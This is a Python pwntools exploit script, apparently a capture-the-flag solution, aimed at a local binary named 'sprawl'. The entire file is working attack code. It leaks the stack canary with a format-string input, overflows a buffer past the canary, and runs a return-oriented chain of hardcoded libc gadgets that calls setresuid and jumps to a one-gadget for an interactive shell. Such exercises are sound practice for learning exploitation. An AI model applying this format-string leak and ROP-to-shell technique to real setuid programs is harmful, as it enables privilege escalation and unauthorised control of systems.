from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

if (args.GDB):
	p = gdb.debug("./sprawl",
	'''
	b * 0x00000000004015e1
	r
	c
	''')
else:
	p = process("./sprawl")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
setuid = libc.symbols["setresuid"]
libc_base1 = 0x7ffff7c00000
pop_rdi = 0x10f78b
pop_rsi = 0x2b46b
pop_rdx = 0xb505c
print(hex(libc_base1+setuid))
pop_rbx = 0xa1e1e
one_gadgetaddr = 0xef4ce

payload = [
#	p64(libc_base1+0x2882f),
	p64(libc_base1+pop_rdi),
	p64(1024),
	p64(libc_base1+pop_rsi),
	p64(1024),
	p64(1234),
	p64(libc_base1+pop_rdx),
	p64(1024),
	p64(0x00),
	p64(0x00),
	p64(0x00),
	p64(0x00),
	p64(libc_base1+setuid),
	p64(libc_base1+pop_rbx),
	p64(0x00),
	p64(0x00),
	p64(0x00),
	p64(0x01),
	p64(libc_base1+0x2882f), #stack 16-byte alignment
	p64(libc_base1+one_gadgetaddr)#	p64(0x401216)
]

chain = b"".join(payload)

p.sendlineafter(b"Route tag: ", b"%23$p")
p.recvuntil(b"Routing via ")
canary = p.recvline()
canary = int(canary.strip().decode(), 16)

p.sendline(b"deadbeef 01f4 0")

payload = b"A" * 72
payload += p64(canary)
payload += p64(0xdeadbeef)
payload += chain
payload += b"\x00" * (500 - len(payload))
p.sendlineafter(b"bytes): ", payload)
p.interactive()
